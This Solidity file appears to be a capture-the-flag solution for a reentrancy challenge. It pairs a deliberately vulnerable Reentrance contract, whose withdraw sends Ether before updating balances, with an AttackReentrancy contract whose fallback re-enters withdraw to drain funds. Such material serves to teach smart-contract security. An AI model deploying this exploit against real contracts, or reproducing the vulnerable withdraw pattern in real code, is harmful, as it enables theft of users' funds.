
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol";


contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}


contract AttackReentrancy {

    Reentrance private reentranceContract;

    uint256 public myBalance = 0.001 ether;

    constructor(address _reentranceAddress){
        reentranceContract = Reentrance(payable(_reentranceAddress));
    }

    function withdrawFromVictim() public {
        reentranceContract.withdraw(myBalance);
    }

    fallback() external payable {
        reentranceContract.withdraw(myBalance);
    }
}
